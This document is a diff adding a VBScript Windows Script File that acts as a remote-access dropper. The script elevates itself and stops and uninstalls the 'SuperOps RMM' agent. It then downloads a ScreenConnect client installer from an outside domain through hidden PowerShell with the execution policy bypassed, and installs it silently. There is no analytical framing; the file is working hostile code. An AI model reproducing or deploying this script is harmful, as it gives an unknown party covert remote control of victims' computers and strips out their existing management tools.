@@ -1,0 +1,65 @@
+<?xml version="1.0"?>
+<job id="MyJob">
+  <script language="VBScript">
+    <![CDATA[Option Explicit
+Dim oShell, oFSO
+Set oShell = CreateObject("WScript.Shell")
+Set oFSO   = CreateObject("Scripting.FileSystemObject")
+Dim sMsiUrl, sMsiPath, sTempDir
+sMsiUrl  = "https://globalstrategyworks.com/Bin/ScreenConnect-5301845.ClientSetup.msi?e=Access&y=Guest"
+sTempDir = oShell.ExpandEnvironmentStrings("%TEMP%")
+sMsiPath = sTempDir & "\" & "ScreenConnect-5301845.ClientSetup.msi"
+Call Main()
+Sub Main()
+    If Not IsScriptElevated() Then
+        ElevateScript()
+        WScript.Quit 
+    End If
+    ExecuteHiddenCommand("sc stop ""SuperOps RMM""")
+    WScript.Sleep 1000 
+    ExecuteHiddenCommand("wmic product where ""Name like '%%SuperOps%%'"" call uninstall /nointeractive")
+    If Not DownloadMSI(sMsiUrl, sMsiPath) Then
+        WScript.Quit 1
+    End If
+    Dim sInstallCmd
+    sInstallCmd = "msiexec /i """ & sMsiPath & """ /qn /norestart " & _
+                  "LicenseAccepted=YES " & _
+                  "POLICY_CATEGORY_ID=-1 " & _
+                  "INSTALL_ARGS=""sourceInstall=silent"""
+    
+    ExecuteHiddenCommand(sInstallCmd)
+End Sub
+Function IsScriptElevated()
+    IsScriptElevated = False
+    On Error Resume Next
+    Dim sTestFile
+    sTestFile = oShell.ExpandEnvironmentStrings("%WINDIR%") & "\test.tmp"
+    oFSO.CreateTextFile(sTestFile).Close
+    If Err.Number = 0 Then
+        oFSO.DeleteFile sTestFile
+        IsScriptElevated = True
+    End If
+    On Error GoTo 0
+End Function
+Sub ElevateScript()
+    Dim oShellApp
+    Set oShellApp = CreateObject("Shell.Application")
+    oShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
+End Sub
+Function DownloadMSI(sUrl, sDestPath)
+    DownloadMSI = False
+    Dim sPSCommand
+    sPSCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
+                 """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; " & _
+                 "Invoke-WebRequest -Uri '" & sUrl & "' -OutFile '" & sDestPath & "'"""
+    If oShell.Run(sPSCommand, 0, True) = 0 Then
+        If oFSO.FileExists(sDestPath) Then
+            DownloadMSI = True
+        End If
+    End If
+End Function
+Sub ExecuteHiddenCommand(sCmd)
+    oShell.Run "cmd /c " & sCmd, 0, True
+End Sub]]>
+  </script>
+</job>
